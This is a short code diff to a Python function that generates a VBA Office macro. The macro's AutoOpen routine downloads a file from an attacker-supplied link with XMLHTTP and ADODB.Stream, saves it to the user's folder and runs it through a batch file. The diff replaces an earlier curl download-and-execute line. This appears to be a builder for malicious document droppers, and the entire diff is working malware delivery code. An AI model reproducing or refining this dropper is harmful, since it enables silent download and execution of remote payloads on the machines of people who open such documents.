@@ -279,11 +279,27 @@ def mkcustomscript(link: str, extension: str) -> str:
 
     return f"""Sub AutoOpen()
     ChDir ("C:/Users/" & Environ("username"))
+    
+    Dim URL As String
+    URL = "{link}"
+    
+    Dim WinHttpReq As Object
+    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
+    WinHttpReq.Open "GET", URL, False
+    WinHttpReq.send
+    
+    Set oStream = CreateObject("ADODB.Stream")
+    oStream.Open
+    oStream.Type = 1
+    oStream.Write WinHttpReq.responseBody
+    oStream.SaveToFile "_rage{extension}", 2
+    oStream.Close
+    
     myFile = "_rage_exec.bat"
     Open myFile For Output As #1
-    Print #1, "curl {link} --silent --output _rage{extension} && start _rage{extension}"
+    Print #1, "start _rage{extension}"
     Close #1
-    Shell("_rage_exec.bat")
+    Shell ("_rage_exec.bat")
 
 End Sub"""
 
